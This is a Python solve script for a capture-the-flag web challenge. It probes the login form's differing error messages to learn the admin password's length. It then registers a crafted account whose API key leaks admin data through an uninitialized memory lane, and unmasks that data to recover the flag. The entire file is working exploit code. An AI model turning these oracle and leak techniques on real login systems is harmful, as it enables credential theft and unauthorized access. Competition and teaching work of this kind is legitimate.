#!/usr/bin/env python3
import argparse
import math
import random
import re
import string
import sys
from urllib.parse import urljoin

import requests


def mask_from_input(data: bytes) -> bytes:
    n = len(data)
    if n == 0:
        return b""

    side = math.ceil(math.sqrt(n))
    total = side * side
    # For the target sizes in this challenge this matches numpy uint16 behavior.
    pad_value = ((sum(data) * 7) + (n * 13) + 41) % 256
    padded = list(data) + [pad_value] * (total - n)

    matrix = [padded[i * side:(i + 1) * side] for i in range(side)]

    # numpy.rot90(matrix), k=1
    rotated = [[matrix[j][side - 1 - i] for j in range(side)] for i in range(side)]

    # np.roll(matrix, 1, axis=1) ^ np.roll(rotated, -1, axis=0)
    zigzag = []
    for i in range(side):
        for j in range(side):
            a = matrix[i][(j - 1) % side]
            b = rotated[(i + 1) % side][j]
            zigzag.append(a ^ b)

    # gram = (matrix @ ((rotated ^ 0xA5).T)) & 0xff
    gram = []
    for i in range(side):
        row = []
        for j in range(side):
            s = 0
            for k in range(side):
                s += matrix[i][k] * (rotated[j][k] ^ 0xA5)
            row.append(s & 0xff)
        gram.append(row)

    diagonal = [gram[i][i] for i in range(side)]
    gram_flat = [x for row in gram for x in row]
    flipud_flat = [x for row in matrix[::-1] for x in row]
    stream = zigzag + diagonal + gram_flat + flipud_flat

    # np.resize(stream, n); stream is longer than n for this challenge, so truncate.
    if len(stream) >= n:
        return bytes(stream[:n])
    out = []
    while len(out) < n:
        out.extend(stream)
    return bytes(out[:n])


def recover_unknown_lane(raw: str, api_key_hex: str) -> bytes:
    digest = bytes.fromhex(api_key_hex.strip())
    payload = bytes(
        ((digest[i] - (digest[i + 1] if i + 1 < len(digest) else 0)) & 0xff)
        for i in range(len(digest))
    )
    mask = mask_from_input(raw.encode())
    return bytes(a ^ b for a, b in zip(payload, mask))


def find_admin_password_len(sess: requests.Session, base: str, max_len: int = 128) -> int:
    login_url = urljoin(base, "/login")
    for length in range(1, max_len + 1):
        r = sess.post(
            login_url,
            data={"username": "admin", "password": "A" * length},
            allow_redirects=True,
            timeout=10,
        )
        text = r.text
        if "Invalid credentials." in text:
            return length
        if "Password too long." in text:
            return length - 1
        if "User not found." in text:
            raise RuntimeError("admin user not found")
    raise RuntimeError("could not determine admin password length")


def register_and_leak(sess: requests.Session, base: str, flag_len: int, attempt: int = 0):
    # Admin raw is: admin + ':' + created_at(19) + ':' + FLAG
    target_raw_len = len("admin") + 1 + 19 + 1 + flag_len

    # Username must start with an EVEN ASCII byte. Admin starts with 'a' (odd),
    # so opposite parity makes the uninitialized lane line up with admin chars.
    suffix = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    username = f"b{suffix}{attempt:x}"[:32]
    if len(username) < 2:
        username = "bb"

    pw_len = target_raw_len - len(username) - 21
    if pw_len < 4:
        username = "bb"
        pw_len = target_raw_len - len(username) - 21
    if not (4 <= pw_len <= 128):
        raise RuntimeError(f"bad chosen password length: {pw_len}")

    password = "C" * pw_len

    r = sess.post(
        urljoin(base, "/register"),
        data={"username": username, "password": password, "bio": "scope"},
        allow_redirects=True,
        timeout=10,
    )
    html = r.text

    if "Username already taken" in html:
        raise RuntimeError("generated username collision, rerun")
    if "api-key" not in html:
        raise RuntimeError("registration did not land on settings page")

    m_key = re.search(r'id=["\']api-key["\'][^>]*>\s*([0-9a-fA-F]+)\s*<', html)
    m_time = re.search(r'<strong>Member since:</strong>\s*([^<\n]+)', html)
    if not m_key or not m_time:
        open("debug_register.html", "w", encoding="utf-8").write(html)
        raise RuntimeError("could not parse api key / created_at; saved debug_register.html")

    api_key = m_key.group(1).strip()
    created_at = m_time.group(1).strip()
    raw = f"{username}:{created_at}:{password}"
    if len(raw) != target_raw_len:
        raise AssertionError((len(raw), target_raw_len, raw))

    leaked = recover_unknown_lane(raw, api_key)
    return username, created_at, api_key, leaked


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base", help="Base URL, e.g. https://http-....urc.tf/")
    ap.add_argument("--flag-len", type=int, default=None, help="Skip oracle and use this admin password length")
    ap.add_argument("--tries", type=int, default=1, help="Extra attempts if first leak is noisy")
    args = ap.parse_args()

    base = args.base.rstrip("/") + "/"
    sess = requests.Session()

    print(f"[*] target: {base}")
    if args.flag_len is None:
        print("[*] finding admin password length via login oracle...")
        flag_len = find_admin_password_len(sess, base)
    else:
        flag_len = args.flag_len
    print(f"[+] admin password/flag length: {flag_len}")
    print(f"[*] target admin raw length: {flag_len + 26}")

    for attempt in range(args.tries):
        print(f"[*] registering leak account, attempt {attempt + 1}/{args.tries}...")
        username, created_at, api_key, leaked = register_and_leak(sess, base, flag_len, attempt)
        ascii_leak = ''.join(chr(c) if 32 <= c < 127 else '.' for c in leaked)
        print(f"[+] username  : {username}")
        print(f"[+] created_at: {created_at}")
        print(f"[+] api_key   : {api_key}")
        print(f"[+] leaked    : {ascii_leak}")

        m = re.search(r"uctf\{[^}\s]+\}", ascii_leak)
        if m:
            print(f"\n[+] FLAG: {m.group(0)}")
            return

    print("\n[-] flag pattern not found. If you registered before running this, reset/restart the instance and rerun once.")
    sys.exit(1)


if __name__ == "__main__":
    main()
